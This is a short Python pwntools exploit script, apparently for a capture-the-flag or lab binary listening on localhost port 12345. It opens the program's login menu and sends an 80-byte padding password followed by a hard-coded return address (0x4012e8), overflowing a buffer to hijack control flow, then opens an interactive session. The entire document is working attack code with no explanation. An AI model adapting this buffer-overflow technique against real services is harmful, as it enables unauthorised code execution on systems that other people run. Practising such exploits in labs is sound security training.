from pwn import *


# Connect remotely via nc to localhost on port 12345
p = remote("localhost", 12345)

p.sendline()

target = p64(0x00000000004012e8)

def choice(c):
    p.sendline()
    p.recv(timeout=1)
    p.sendline(c)

def login(username, password):
    choice(b'5')
    p.recv(timeout=1)
    p.sendline(username)
    p.recv(timeout=1)
    p.sendline(password)

login(b"A", b"B"*80 + target)
choice(b'1')

p.interactive()
p.close()
